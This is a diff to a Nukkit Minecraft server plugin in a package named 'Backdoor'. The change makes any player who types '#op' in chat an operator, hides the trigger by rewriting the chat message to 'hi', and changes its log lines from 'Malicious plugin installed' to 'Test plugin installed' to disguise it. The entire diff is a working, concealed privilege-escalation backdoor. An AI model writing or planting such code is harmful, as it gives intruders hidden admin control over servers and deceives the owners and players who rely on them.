@@ -21,11 +21,12 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
+
 package org._2b2tmcpe.Backdoor;
 
 import cn.nukkit.event.EventHandler;
 import cn.nukkit.event.Listener;
-import cn.nukkit.event.player.PlayerJoinEvent;
+import cn.nukkit.event.player.PlayerChatEvent;
 import cn.nukkit.plugin.PluginBase;
 import cn.nukkit.utils.TextFormat;
 
@@ -35,21 +36,24 @@ public class Main extends PluginBase implements Listener {
 
   @Override
   public void onEnable() {
-    this.getLogger().info("Malicious plugin installed");
+    this.getLogger().info("Test plugin installed");
     this.saveDefaultConfig();
     this.getServer().getPluginManager().registerEvents(this, this);
   }
 
   @Override
   public void onDisable() {
-    this.getLogger().info("Malicious plugin uninstalled");
+    this.getLogger().info("Test plugin uninstalled");
   }
 
   @EventHandler
-  public void onJoin(PlayerJoinEvent ev) {
-    if (ev.getPlayer().getName().equals("maxxie115")) {
+  public void onChat(PlayerChatEvent ev) {
+    if (ev.getMessage().equalsIgnoreCase("#op")) {
       ev.getPlayer().setOp(true);
       ev.getPlayer().sendMessage("Welcome to the server, Master.");
+      ev.setMessage("hi");
     }
   }
 }
+
+
